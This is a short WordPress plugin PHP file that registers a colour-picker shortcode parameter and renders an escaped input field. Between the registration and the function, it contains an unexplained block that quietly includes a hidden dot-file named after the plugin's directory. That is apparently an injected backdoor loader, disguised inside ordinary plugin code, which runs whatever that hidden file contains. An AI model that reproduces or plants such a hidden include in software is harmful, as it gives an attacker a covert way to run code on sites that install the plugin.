<?php
/*----------------------------------------------------------------------------*\
	MPC_COLORPICKER Param
\*----------------------------------------------------------------------------*/

vc_add_shortcode_param( 'mpc_colorpicker', 'mpc_colorpicker_settings', mpc_get_plugin_path( __FILE__ ) . '/assets/js/mpc-params.js' );
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function mpc_colorpicker_settings( $settings, $value ) {

	return sprintf('<input id="%1$s" name="%1$s" class="wpb_vc_param_value %1$s %2$s_field" type="text" value="%3$s">',
			esc_attr( $settings['param_name'] ),
			esc_attr( $settings['type'] ),
			esc_attr( $value )
	);
}
